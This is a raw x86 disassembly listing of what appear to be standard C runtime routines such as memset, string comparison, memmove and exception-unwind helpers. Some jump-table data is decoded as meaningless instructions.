  4261e5:	cmp    eax,edi
  4261e7:	je     0x426207
  4261e9:	push   0x0
  4261eb:	push   0x0
  4261ed:	lea    ecx,[ebp+0x10]
  4261f0:	push   ecx
  4261f1:	push   DWORD PTR [ebp+0xc]
  4261f4:	push   eax
  4261f5:	push   edi
  4261f6:	call   0x426c16
  4261fb:	add    esp,0x18
  4261fe:	mov    esi,eax
  426200:	test   esi,esi
  426202:	je     0x4261e1
  426204:	mov    DWORD PTR [ebp+0xc],esi
  426207:	push   DWORD PTR [ebp+0x14]
  42620a:	push   DWORD PTR [ebp+0x10]
  42620d:	push   DWORD PTR [ebp+0xc]
  426210:	push   DWORD PTR [ebp+0x8]
  426213:	push   ebx
  426214:	call   DWORD PTR ds:0x428108
  42621a:	mov    edi,eax
  42621c:	test   esi,esi
  42621e:	je     0x426227
  426220:	push   esi
  426221:	call   0x42455a
  426226:	pop    ecx
  426227:	mov    eax,edi
  426229:	lea    esp,[ebp-0x38]
  42622c:	call   0x42398b
  426231:	ret    
  426232:	mov    eax,ds:0x466004
  426237:	test   eax,eax
  426239:	je     0x42624a
  42623b:	push   DWORD PTR [esp+0x4]
  42623f:	call   eax
  426241:	test   eax,eax
  426243:	pop    ecx
  426244:	je     0x42624a
  426246:	xor    eax,eax
  426248:	inc    eax
  426249:	ret    
  42624a:	xor    eax,eax
  42624c:	ret    
  42624d:	int3   
  42624e:	int3   
  42624f:	int3   
  426250:	mov    edx,DWORD PTR [esp+0xc]
  426254:	mov    ecx,DWORD PTR [esp+0x4]
  426258:	test   edx,edx
  42625a:	je     0x4262ab
  42625c:	xor    eax,eax
  42625e:	mov    al,BYTE PTR [esp+0x8]
  426262:	push   edi
  426263:	mov    edi,ecx
  426265:	cmp    edx,0x4
  426268:	jb     0x42629b
  42626a:	neg    ecx
  42626c:	and    ecx,0x3
  42626f:	je     0x42627d
  426271:	sub    edx,ecx
  426273:	mov    BYTE PTR [edi],al
  426275:	add    edi,0x1
  426278:	sub    ecx,0x1
  42627b:	jne    0x426273
  42627d:	mov    ecx,eax
  42627f:	shl    eax,0x8
  426282:	add    eax,ecx
  426284:	mov    ecx,eax
  426286:	shl    eax,0x10
  426289:	add    eax,ecx
  42628b:	mov    ecx,edx
  42628d:	and    edx,0x3
  426290:	shr    ecx,0x2
  426293:	je     0x42629b
  426295:	rep stos DWORD PTR es:[edi],eax
  426297:	test   edx,edx
  426299:	je     0x4262a5
  42629b:	mov    BYTE PTR [edi],al
  42629d:	add    edi,0x1
  4262a0:	sub    edx,0x1
  4262a3:	jne    0x42629b
  4262a5:	mov    eax,DWORD PTR [esp+0x8]
  4262a9:	pop    edi
  4262aa:	ret    
  4262ab:	mov    eax,DWORD PTR [esp+0x4]
  4262af:	ret    
  4262b0:	push   esi
  4262b1:	mov    esi,DWORD PTR [esp+0x8]
  4262b5:	test   esi,esi
  4262b7:	je     0x42643e
  4262bd:	push   DWORD PTR [esi+0x4]
  4262c0:	call   0x42455a
  4262c5:	push   DWORD PTR [esi+0x8]
  4262c8:	call   0x42455a
  4262cd:	push   DWORD PTR [esi+0xc]
  4262d0:	call   0x42455a
  4262d5:	push   DWORD PTR [esi+0x10]
  4262d8:	call   0x42455a
  4262dd:	push   DWORD PTR [esi+0x14]
  4262e0:	call   0x42455a
  4262e5:	push   DWORD PTR [esi+0x18]
  4262e8:	call   0x42455a
  4262ed:	push   DWORD PTR [esi]
  4262ef:	call   0x42455a
  4262f4:	push   DWORD PTR [esi+0x20]
  4262f7:	call   0x42455a
  4262fc:	push   DWORD PTR [esi+0x24]
  4262ff:	call   0x42455a
  426304:	push   DWORD PTR [esi+0x28]
  426307:	call   0x42455a
  42630c:	push   DWORD PTR [esi+0x2c]
  42630f:	call   0x42455a
  426314:	push   DWORD PTR [esi+0x30]
  426317:	call   0x42455a
  42631c:	push   DWORD PTR [esi+0x34]
  42631f:	call   0x42455a
  426324:	push   DWORD PTR [esi+0x1c]
  426327:	call   0x42455a
  42632c:	push   DWORD PTR [esi+0x38]
  42632f:	call   0x42455a
  426334:	push   DWORD PTR [esi+0x3c]
  426337:	call   0x42455a
  42633c:	add    esp,0x40
  42633f:	push   DWORD PTR [esi+0x40]
  426342:	call   0x42455a
  426347:	push   DWORD PTR [esi+0x44]
  42634a:	call   0x42455a
  42634f:	push   DWORD PTR [esi+0x48]
  426352:	call   0x42455a
  426357:	push   DWORD PTR [esi+0x4c]
  42635a:	call   0x42455a
  42635f:	push   DWORD PTR [esi+0x50]
  426362:	call   0x42455a
  426367:	push   DWORD PTR [esi+0x54]
  42636a:	call   0x42455a
  42636f:	push   DWORD PTR [esi+0x58]
  426372:	call   0x42455a
  426377:	push   DWORD PTR [esi+0x5c]
  42637a:	call   0x42455a
  42637f:	push   DWORD PTR [esi+0x60]
  426382:	call   0x42455a
  426387:	push   DWORD PTR [esi+0x64]
  42638a:	call   0x42455a
  42638f:	push   DWORD PTR [esi+0x68]
  426392:	call   0x42455a
  426397:	push   DWORD PTR [esi+0x6c]
  42639a:	call   0x42455a
  42639f:	push   DWORD PTR [esi+0x70]
  4263a2:	call   0x42455a
  4263a7:	push   DWORD PTR [esi+0x74]
  4263aa:	call   0x42455a
  4263af:	push   DWORD PTR [esi+0x78]
  4263b2:	call   0x42455a
  4263b7:	push   DWORD PTR [esi+0x7c]
  4263ba:	call   0x42455a
  4263bf:	add    esp,0x40
  4263c2:	push   DWORD PTR [esi+0x80]
  4263c8:	call   0x42455a
  4263cd:	push   DWORD PTR [esi+0x84]
  4263d3:	call   0x42455a
  4263d8:	push   DWORD PTR [esi+0x88]
  4263de:	call   0x42455a
  4263e3:	push   DWORD PTR [esi+0x8c]
  4263e9:	call   0x42455a
  4263ee:	push   DWORD PTR [esi+0x90]
  4263f4:	call   0x42455a
  4263f9:	push   DWORD PTR [esi+0x94]
  4263ff:	call   0x42455a
  426404:	push   DWORD PTR [esi+0x98]
  42640a:	call   0x42455a
  42640f:	push   DWORD PTR [esi+0x9c]
  426415:	call   0x42455a
  42641a:	push   DWORD PTR [esi+0xa0]
  426420:	call   0x42455a
  426425:	push   DWORD PTR [esi+0xa4]
  42642b:	call   0x42455a
  426430:	push   DWORD PTR [esi+0xa8]
  426436:	call   0x42455a
  42643b:	add    esp,0x2c
  42643e:	pop    esi
  42643f:	ret    
  426440:	push   esi
  426441:	mov    esi,DWORD PTR [esp+0x8]
  426445:	test   esi,esi
  426447:	je     0x42649d
  426449:	mov    eax,DWORD PTR [esi]
  42644b:	mov    ecx,DWORD PTR ds:0x465b64
  426451:	cmp    eax,DWORD PTR [ecx]
  426453:	je     0x426464
  426455:	cmp    eax,DWORD PTR ds:0x465b34
  42645b:	je     0x426464
  42645d:	push   eax
  42645e:	call   0x42455a
  426463:	pop    ecx
  426464:	mov    eax,DWORD PTR [esi+0x4]
  426467:	mov    ecx,DWORD PTR ds:0x465b64
  42646d:	cmp    eax,DWORD PTR [ecx+0x4]
  426470:	je     0x426481
  426472:	cmp    eax,DWORD PTR ds:0x465b38
  426478:	je     0x426481
  42647a:	push   eax
  42647b:	call   0x42455a
  426480:	pop    ecx
  426481:	mov    esi,DWORD PTR [esi+0x8]
  426484:	mov    eax,ds:0x465b64
  426489:	cmp    esi,DWORD PTR [eax+0x8]
  42648c:	je     0x42649d
  42648e:	cmp    esi,DWORD PTR ds:0x465b3c
  426494:	je     0x42649d
  426496:	push   esi
  426497:	call   0x42455a
  42649c:	pop    ecx
  42649d:	pop    esi
  42649e:	ret    
  42649f:	push   esi
  4264a0:	mov    esi,DWORD PTR [esp+0x8]
  4264a4:	test   esi,esi
  4264a6:	je     0x426576
  4264ac:	mov    eax,DWORD PTR [esi+0xc]
  4264af:	mov    ecx,DWORD PTR ds:0x465b64
  4264b5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264b8:	je     0x4264c9
  4264ba:	cmp    eax,DWORD PTR ds:0x465b40
  4264c0:	je     0x4264c9
  4264c2:	push   eax
  4264c3:	call   0x42455a
  4264c8:	pop    ecx
  4264c9:	mov    eax,DWORD PTR [esi+0x10]
  4264cc:	mov    ecx,DWORD PTR ds:0x465b64
  4264d2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264d5:	je     0x4264e6
  4264d7:	cmp    eax,DWORD PTR ds:0x465b44
  4264dd:	je     0x4264e6
  4264df:	push   eax
  4264e0:	call   0x42455a
  4264e5:	pop    ecx
  4264e6:	mov    eax,DWORD PTR [esi+0x14]
  4264e9:	mov    ecx,DWORD PTR ds:0x465b64
  4264ef:	cmp    eax,DWORD PTR [ecx+0x14]
  4264f2:	je     0x426503
  4264f4:	cmp    eax,DWORD PTR ds:0x465b48
  4264fa:	je     0x426503
  4264fc:	push   eax
  4264fd:	call   0x42455a
  426502:	pop    ecx
  426503:	mov    eax,DWORD PTR [esi+0x18]
  426506:	mov    ecx,DWORD PTR ds:0x465b64
  42650c:	cmp    eax,DWORD PTR [ecx+0x18]
  42650f:	je     0x426520
  426511:	cmp    eax,DWORD PTR ds:0x465b4c
  426517:	je     0x426520
  426519:	push   eax
  42651a:	call   0x42455a
  42651f:	pop    ecx
  426520:	mov    eax,DWORD PTR [esi+0x1c]
  426523:	mov    ecx,DWORD PTR ds:0x465b64
  426529:	cmp    eax,DWORD PTR [ecx+0x1c]
  42652c:	je     0x42653d
  42652e:	cmp    eax,DWORD PTR ds:0x465b50
  426534:	je     0x42653d
  426536:	push   eax
  426537:	call   0x42455a
  42653c:	pop    ecx
  42653d:	mov    eax,DWORD PTR [esi+0x20]
  426540:	mov    ecx,DWORD PTR ds:0x465b64
  426546:	cmp    eax,DWORD PTR [ecx+0x20]
  426549:	je     0x42655a
  42654b:	cmp    eax,DWORD PTR ds:0x465b54
  426551:	je     0x42655a
  426553:	push   eax
  426554:	call   0x42455a
  426559:	pop    ecx
  42655a:	mov    esi,DWORD PTR [esi+0x24]
  42655d:	mov    eax,ds:0x465b64
  426562:	cmp    esi,DWORD PTR [eax+0x24]
  426565:	je     0x426576
  426567:	cmp    esi,DWORD PTR ds:0x465b58
  42656d:	je     0x426576
  42656f:	push   esi
  426570:	call   0x42455a
  426575:	pop    ecx
  426576:	pop    esi
  426577:	ret    
  426578:	int3   
  426579:	int3   
  42657a:	int3   
  42657b:	int3   
  42657c:	int3   
  42657d:	int3   
  42657e:	int3   
  42657f:	int3   
  426580:	push   ebp
  426581:	mov    ebp,esp
  426583:	push   esi
  426584:	xor    eax,eax
  426586:	push   eax
  426587:	push   eax
  426588:	push   eax
  426589:	push   eax
  42658a:	push   eax
  42658b:	push   eax
  42658c:	push   eax
  42658d:	push   eax
  42658e:	mov    edx,DWORD PTR [ebp+0xc]
  426591:	lea    ecx,[ecx+0x0]
  426594:	mov    al,BYTE PTR [edx]
  426596:	or     al,al
  426598:	je     0x4265a3
  42659a:	add    edx,0x1
  42659d:	bts    DWORD PTR [esp],eax
  4265a1:	jmp    0x426594
  4265a3:	mov    esi,DWORD PTR [ebp+0x8]
  4265a6:	or     ecx,0xffffffff
  4265a9:	lea    ecx,[ecx+0x0]
  4265ac:	add    ecx,0x1
  4265af:	mov    al,BYTE PTR [esi]
  4265b1:	or     al,al
  4265b3:	je     0x4265be
  4265b5:	add    esi,0x1
  4265b8:	bt     DWORD PTR [esp],eax
  4265bc:	jae    0x4265ac
  4265be:	mov    eax,ecx
  4265c0:	add    esp,0x20
  4265c3:	pop    esi
  4265c4:	leave  
  4265c5:	ret    
  4265c6:	int3   
  4265c7:	int3   
  4265c8:	int3   
  4265c9:	int3   
  4265ca:	int3   
  4265cb:	int3   
  4265cc:	int3   
  4265cd:	int3   
  4265ce:	int3   
  4265cf:	int3   
  4265d0:	mov    edx,DWORD PTR [esp+0x4]
  4265d4:	mov    ecx,DWORD PTR [esp+0x8]
  4265d8:	test   edx,0x3
  4265de:	jne    0x42661c
  4265e0:	mov    eax,DWORD PTR [edx]
  4265e2:	cmp    al,BYTE PTR [ecx]
  4265e4:	jne    0x426614
  4265e6:	or     al,al
  4265e8:	je     0x426610
  4265ea:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ed:	jne    0x426614
  4265ef:	or     ah,ah
  4265f1:	je     0x426610
  4265f3:	shr    eax,0x10
  4265f6:	cmp    al,BYTE PTR [ecx+0x2]
  4265f9:	jne    0x426614
  4265fb:	or     al,al
  4265fd:	je     0x426610
  4265ff:	cmp    ah,BYTE PTR [ecx+0x3]
  426602:	jne    0x426614
  426604:	add    ecx,0x4
  426607:	add    edx,0x4
  42660a:	or     ah,ah
  42660c:	jne    0x4265e0
  42660e:	mov    edi,edi
  426610:	xor    eax,eax
  426612:	ret    
  426613:	nop
  426614:	sbb    eax,eax
  426616:	shl    eax,1
  426618:	add    eax,0x1
  42661b:	ret    
  42661c:	test   edx,0x1
  426622:	je     0x42663c
  426624:	mov    al,BYTE PTR [edx]
  426626:	add    edx,0x1
  426629:	cmp    al,BYTE PTR [ecx]
  42662b:	jne    0x426614
  42662d:	add    ecx,0x1
  426630:	or     al,al
  426632:	je     0x426610
  426634:	test   edx,0x2
  42663a:	je     0x4265e0
  42663c:	mov    ax,WORD PTR [edx]
  42663f:	add    edx,0x2
  426642:	cmp    al,BYTE PTR [ecx]
  426644:	jne    0x426614
  426646:	or     al,al
  426648:	je     0x426610
  42664a:	cmp    ah,BYTE PTR [ecx+0x1]
  42664d:	jne    0x426614
  42664f:	or     ah,ah
  426651:	je     0x426610
  426653:	add    ecx,0x2
  426656:	jmp    0x4265e0
  426658:	int3   
  426659:	int3   
  42665a:	int3   
  42665b:	int3   
  42665c:	int3   
  42665d:	int3   
  42665e:	int3   
  42665f:	int3   
  426660:	mov    eax,DWORD PTR [esp+0xc]
  426664:	test   eax,eax
  426666:	je     0x4266b2
  426668:	mov    edx,DWORD PTR [esp+0x4]
  42666c:	push   esi
  42666d:	push   edi
  42666e:	mov    esi,edx
  426670:	mov    edi,DWORD PTR [esp+0x10]
  426674:	or     edx,edi
  426676:	and    edx,0x3
  426679:	je     0x4266b3
  42667b:	test   eax,0x1
  426680:	je     0x426693
  426682:	mov    cl,BYTE PTR [esi]
  426684:	cmp    cl,BYTE PTR [edi]
  426686:	jne    0x4266e0
  426688:	add    esi,0x1
  42668b:	add    edi,0x1
  42668e:	sub    eax,0x1
  426691:	je     0x4266b0
  426693:	mov    cl,BYTE PTR [esi]
  426695:	mov    dl,BYTE PTR [edi]
  426697:	cmp    cl,dl
  426699:	jne    0x4266e0
  42669b:	mov    cl,BYTE PTR [esi+0x1]
  42669e:	mov    dl,BYTE PTR [edi+0x1]
  4266a1:	cmp    cl,dl
  4266a3:	jne    0x4266e0
  4266a5:	add    edi,0x2
  4266a8:	add    esi,0x2
  4266ab:	sub    eax,0x2
  4266ae:	jne    0x426693
  4266b0:	pop    edi
  4266b1:	pop    esi
  4266b2:	ret    
  4266b3:	mov    ecx,eax
  4266b5:	and    eax,0x3
  4266b8:	shr    ecx,0x2
  4266bb:	je     0x4266e8
  4266bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	je     0x4266e8
  4266c1:	mov    ecx,DWORD PTR [esi-0x4]
  4266c4:	mov    edx,DWORD PTR [edi-0x4]
  4266c7:	cmp    cl,dl
  4266c9:	jne    0x4266db
  4266cb:	cmp    ch,dh
  4266cd:	jne    0x4266db
  4266cf:	shr    ecx,0x10
  4266d2:	shr    edx,0x10
  4266d5:	cmp    cl,dl
  4266d7:	jne    0x4266db
  4266d9:	cmp    ch,dh
  4266db:	mov    eax,0x0
  4266e0:	sbb    eax,eax
  4266e2:	pop    edi
  4266e3:	sbb    eax,0xffffffff
  4266e6:	pop    esi
  4266e7:	ret    
  4266e8:	test   eax,eax
  4266ea:	je     0x4266b0
  4266ec:	mov    edx,DWORD PTR [esi]
  4266ee:	mov    ecx,DWORD PTR [edi]
  4266f0:	cmp    dl,cl
  4266f2:	jne    0x4266db
  4266f4:	sub    eax,0x1
  4266f7:	je     0x426715
  4266f9:	cmp    dh,ch
  4266fb:	jne    0x4266db
  4266fd:	sub    eax,0x1
  426700:	je     0x426715
  426702:	and    ecx,0xff0000
  426708:	and    edx,0xff0000
  42670e:	cmp    edx,ecx
  426710:	jne    0x4266db
  426712:	sub    eax,0x1
  426715:	pop    edi
  426716:	pop    esi
  426717:	ret    
  426718:	int3   
  426719:	int3   
  42671a:	int3   
  42671b:	int3   
  42671c:	int3   
  42671d:	int3   
  42671e:	int3   
  42671f:	int3   
  426720:	push   ebp
  426721:	mov    ebp,esp
  426723:	push   edi
  426724:	push   esi
  426725:	push   ebx
  426726:	mov    ecx,DWORD PTR [ebp+0x10]
  426729:	jecxz  0x426752
  42672b:	mov    ebx,ecx
  42672d:	mov    edi,DWORD PTR [ebp+0x8]
  426730:	mov    esi,edi
  426732:	xor    eax,eax
  426734:	repnz scas al,BYTE PTR es:[edi]
  426736:	neg    ecx
  426738:	add    ecx,ebx
  42673a:	mov    edi,esi
  42673c:	mov    esi,DWORD PTR [ebp+0xc]
  42673f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426741:	mov    al,BYTE PTR [esi-0x1]
  426744:	xor    ecx,ecx
  426746:	cmp    al,BYTE PTR [edi-0x1]
  426749:	ja     0x426750
  42674b:	je     0x426752
  42674d:	sub    ecx,0x2
  426750:	not    ecx
  426752:	mov    eax,ecx
  426754:	pop    ebx
  426755:	pop    esi
  426756:	pop    edi
  426757:	leave  
  426758:	ret    
  426759:	int3   
  42675a:	int3   
  42675b:	int3   
  42675c:	int3   
  42675d:	int3   
  42675e:	int3   
  42675f:	int3   
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   esi
  426764:	xor    eax,eax
  426766:	push   eax
  426767:	push   eax
  426768:	push   eax
  426769:	push   eax
  42676a:	push   eax
  42676b:	push   eax
  42676c:	push   eax
  42676d:	push   eax
  42676e:	mov    edx,DWORD PTR [ebp+0xc]
  426771:	lea    ecx,[ecx+0x0]
  426774:	mov    al,BYTE PTR [edx]
  426776:	or     al,al
  426778:	je     0x426783
  42677a:	add    edx,0x1
  42677d:	bts    DWORD PTR [esp],eax
  426781:	jmp    0x426774
  426783:	mov    esi,DWORD PTR [ebp+0x8]
  426786:	mov    edi,edi
  426788:	mov    al,BYTE PTR [esi]
  42678a:	or     al,al
  42678c:	je     0x42679a
  42678e:	add    esi,0x1
  426791:	bt     DWORD PTR [esp],eax
  426795:	jae    0x426788
  426797:	lea    eax,[esi-0x1]
  42679a:	add    esp,0x20
  42679d:	pop    esi
  42679e:	leave  
  42679f:	ret    
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   ebx
  4267a4:	push   esi
  4267a5:	push   edi
  4267a6:	push   ebp
  4267a7:	push   0x0
  4267a9:	push   0x0
  4267ab:	push   0x4267b8
  4267b0:	push   DWORD PTR [ebp+0x8]
  4267b3:	call   0x42722e
  4267b8:	pop    ebp
  4267b9:	pop    edi
  4267ba:	pop    esi
  4267bb:	pop    ebx
  4267bc:	mov    esp,ebp
  4267be:	pop    ebp
  4267bf:	ret    
  4267c0:	mov    ecx,DWORD PTR [esp+0x4]
  4267c4:	test   DWORD PTR [ecx+0x4],0x6
  4267cb:	mov    eax,0x1
  4267d0:	je     0x4267e1
  4267d2:	mov    eax,DWORD PTR [esp+0x8]
  4267d6:	mov    edx,DWORD PTR [esp+0x10]
  4267da:	mov    DWORD PTR [edx],eax
  4267dc:	mov    eax,0x3
  4267e1:	ret    
  4267e2:	push   ebx
  4267e3:	push   esi
  4267e4:	push   edi
  4267e5:	mov    eax,DWORD PTR [esp+0x10]
  4267e9:	push   eax
  4267ea:	push   0xfffffffe
  4267ec:	push   0x4267c0
  4267f1:	push   DWORD PTR fs:0x0
  4267f8:	mov    DWORD PTR fs:0x0,esp
  4267ff:	mov    eax,DWORD PTR [esp+0x20]
  426803:	mov    ebx,DWORD PTR [eax+0x8]
  426806:	mov    esi,DWORD PTR [eax+0xc]
  426809:	cmp    esi,0xffffffff
  42680c:	je     0x42683c
  42680e:	cmp    esi,DWORD PTR [esp+0x24]
  426812:	je     0x42683c
  426814:	lea    esi,[esi+esi*2]
  426817:	mov    ecx,DWORD PTR [ebx+esi*4]
  42681a:	mov    DWORD PTR [esp+0x8],ecx
  42681e:	mov    DWORD PTR [eax+0xc],ecx
  426821:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426826:	jne    0x42683a
  426828:	push   0x101
  42682d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426831:	call   0x426876
  426836:	call   DWORD PTR [ebx+esi*4+0x8]
  42683a:	jmp    0x4267ff
  42683c:	pop    DWORD PTR fs:0x0
  426843:	add    esp,0xc
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	ret    
  42684a:	xor    eax,eax
  42684c:	mov    ecx,DWORD PTR fs:0x0
  426853:	cmp    DWORD PTR [ecx+0x4],0x4267c0
  42685a:	jne    0x42686c
  42685c:	mov    edx,DWORD PTR [ecx+0xc]
  42685f:	mov    edx,DWORD PTR [edx+0xc]
  426862:	cmp    DWORD PTR [ecx+0x8],edx
  426865:	jne    0x42686c
  426867:	mov    eax,0x1
  42686c:	ret    
  42686d:	push   ebx
  42686e:	push   ecx
  42686f:	mov    ebx,0x465b7c
  426874:	jmp    0x426880
  426876:	push   ebx
  426877:	push   ecx
  426878:	mov    ebx,0x465b7c
  42687d:	mov    ecx,DWORD PTR [ebp+0x8]
  426880:	mov    DWORD PTR [ebx+0x8],ecx
  426883:	mov    DWORD PTR [ebx+0x4],eax
  426886:	mov    DWORD PTR [ebx+0xc],ebp
  426889:	pop    ecx
  42688a:	pop    ebx
  42688b:	ret    0x4
  42688e:	int3   
  42688f:	int3   
  426890:	push   ebp
  426891:	mov    ebp,esp
  426893:	push   edi
  426894:	push   esi
  426895:	mov    esi,DWORD PTR [ebp+0xc]
  426898:	mov    ecx,DWORD PTR [ebp+0x10]
  42689b:	mov    edi,DWORD PTR [ebp+0x8]
  42689e:	mov    eax,ecx
  4268a0:	mov    edx,ecx
  4268a2:	add    eax,esi
  4268a4:	cmp    edi,esi
  4268a6:	jbe    0x4268b0
  4268a8:	cmp    edi,eax
  4268aa:	jb     0x426a2c
  4268b0:	test   edi,0x3
  4268b6:	jne    0x4268cc
  4268b8:	shr    ecx,0x2
  4268bb:	and    edx,0x3
  4268be:	cmp    ecx,0x8
  4268c1:	jb     0x4268ec
  4268c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c5:	jmp    DWORD PTR [edx*4+0x4269dc]
  4268cc:	mov    eax,edi
  4268ce:	mov    edx,0x3
  4268d3:	sub    ecx,0x4
  4268d6:	jb     0x4268e4
  4268d8:	and    eax,0x3
  4268db:	add    ecx,eax
  4268dd:	jmp    DWORD PTR [eax*4+0x4268f0]
  4268e4:	jmp    DWORD PTR [ecx*4+0x4269ec]
  4268eb:	nop
  4268ec:	jmp    DWORD PTR [ecx*4+0x426970]
  4268f3:	nop
  4268f4:	add    BYTE PTR [ecx+0x42],ch
  4268f7:	add    BYTE PTR [ecx+ebp*2],ch
  4268fa:	inc    edx
  4268fb:	add    BYTE PTR [eax+0x69],dl
  4268fe:	inc    edx
  4268ff:	add    BYTE PTR [ebx],ah
  426901:	ror    DWORD PTR [edx-0x75f877fa],1
  426907:	inc    esi
  426908:	add    DWORD PTR [eax+0x468a0147],ecx
  42690e:	add    al,cl
  426910:	jmp    0x289f117
  426915:	add    esi,0x3
  426918:	add    edi,0x3
  42691b:	cmp    ecx,0x8
  42691e:	jb     0x4268ec
  426920:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	jmp    DWORD PTR [edx*4+0x4269dc]
  426929:	lea    ecx,[ecx+0x0]
  42692c:	and    edx,ecx
  42692e:	mov    al,BYTE PTR [esi]
  426930:	mov    BYTE PTR [edi],al
  426932:	mov    al,BYTE PTR [esi+0x1]
  426935:	shr    ecx,0x2
  426938:	mov    BYTE PTR [edi+0x1],al
  42693b:	add    esi,0x2
  42693e:	add    edi,0x2
  426941:	cmp    ecx,0x8
  426944:	jb     0x4268ec
  426946:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426948:	jmp    DWORD PTR [edx*4+0x4269dc]
  42694f:	nop
  426950:	and    edx,ecx
  426952:	mov    al,BYTE PTR [esi]
  426954:	mov    BYTE PTR [edi],al
  426956:	add    esi,0x1
  426959:	shr    ecx,0x2
  42695c:	add    edi,0x1
  42695f:	cmp    ecx,0x8
  426962:	jb     0x4268ec
  426964:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	jmp    DWORD PTR [edx*4+0x4269dc]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	shr    DWORD PTR [ecx+0x42],cl
  426973:	add    al,al
  426975:	imul   eax,DWORD PTR [edx+0x0],0x4269b8
  42697c:	mov    al,0x69
  42697e:	inc    edx
  42697f:	add    BYTE PTR [eax-0x5fffbd97],ch
  426985:	imul   eax,DWORD PTR [edx+0x0],0x426998
  42698c:	nop
  42698d:	imul   eax,DWORD PTR [edx+0x0],0xe48e448b
  426994:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269c8:	lea    eax,[ecx*4+0x0]
  4269cf:	add    esi,eax
  4269d1:	add    edi,eax
  4269d3:	jmp    DWORD PTR [edx*4+0x4269dc]
  4269da:	mov    edi,edi
  4269dc:	in     al,dx
  4269dd:	imul   eax,DWORD PTR [edx+0x0],0x4269f4
  4269e4:	add    BYTE PTR [edx+0x42],ch
  4269e7:	add    BYTE PTR [edx+ebp*2],dl
  4269ea:	inc    edx
  4269eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269f1:	leave  
  4269f2:	ret    
  4269f3:	nop
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    eax,DWORD PTR [ebp+0x8]
  4269fb:	pop    esi
  4269fc:	pop    edi
  4269fd:	leave  
  4269fe:	ret    
  4269ff:	nop
  426a00:	mov    al,BYTE PTR [esi]
  426a02:	mov    BYTE PTR [edi],al
  426a04:	mov    al,BYTE PTR [esi+0x1]
  426a07:	mov    BYTE PTR [edi+0x1],al
  426a0a:	mov    eax,DWORD PTR [ebp+0x8]
  426a0d:	pop    esi
  426a0e:	pop    edi
  426a0f:	leave  
  426a10:	ret    
  426a11:	lea    ecx,[ecx+0x0]
  426a14:	mov    al,BYTE PTR [esi]
  426a16:	mov    BYTE PTR [edi],al
  426a18:	mov    al,BYTE PTR [esi+0x1]
  426a1b:	mov    BYTE PTR [edi+0x1],al
  426a1e:	mov    al,BYTE PTR [esi+0x2]
  426a21:	mov    BYTE PTR [edi+0x2],al
  426a24:	mov    eax,DWORD PTR [ebp+0x8]
  426a27:	pop    esi
  426a28:	pop    edi
  426a29:	leave  
  426a2a:	ret    
  426a2b:	nop
  426a2c:	lea    esi,[ecx+esi*1-0x4]
  426a30:	lea    edi,[ecx+edi*1-0x4]
  426a34:	test   edi,0x3
  426a3a:	jne    0x426a60
  426a3c:	shr    ecx,0x2
  426a3f:	and    edx,0x3
  426a42:	cmp    ecx,0x8
  426a45:	jb     0x426a54
  426a47:	std    
  426a48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a4a:	cld    
  426a4b:	jmp    DWORD PTR [edx*4+0x426b78]
  426a52:	mov    edi,edi
  426a54:	neg    ecx
  426a56:	jmp    DWORD PTR [ecx*4+0x426b28]
  426a5d:	lea    ecx,[ecx+0x0]
  426a60:	mov    eax,edi
  426a62:	mov    edx,0x3
  426a67:	cmp    ecx,0x4
  426a6a:	jb     0x426a78
  426a6c:	and    eax,0x3
  426a6f:	sub    ecx,eax
  426a71:	jmp    DWORD PTR [eax*4+0x426a7c]
  426a78:	jmp    DWORD PTR [ecx*4+0x426b78]
  426a7f:	nop
  426a80:	mov    WORD PTR [edx+0x42],gs
  426a83:	add    BYTE PTR [eax-0x27ffbd96],dh
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a91:	mov    BYTE PTR [edi+0x3],al
  426a94:	sub    esi,0x1
  426a97:	shr    ecx,0x2
  426a9a:	sub    edi,0x1
  426a9d:	cmp    ecx,0x8
  426aa0:	jb     0x426a54
  426aa2:	std    
  426aa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	cld    
  426aa6:	jmp    DWORD PTR [edx*4+0x426b78]
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	and    edx,ecx
  426ab5:	mov    BYTE PTR [edi+0x3],al
  426ab8:	mov    al,BYTE PTR [esi+0x2]
  426abb:	shr    ecx,0x2
  426abe:	mov    BYTE PTR [edi+0x2],al
  426ac1:	sub    esi,0x2
  426ac4:	sub    edi,0x2
  426ac7:	cmp    ecx,0x8
  426aca:	jb     0x426a54
  426acc:	std    
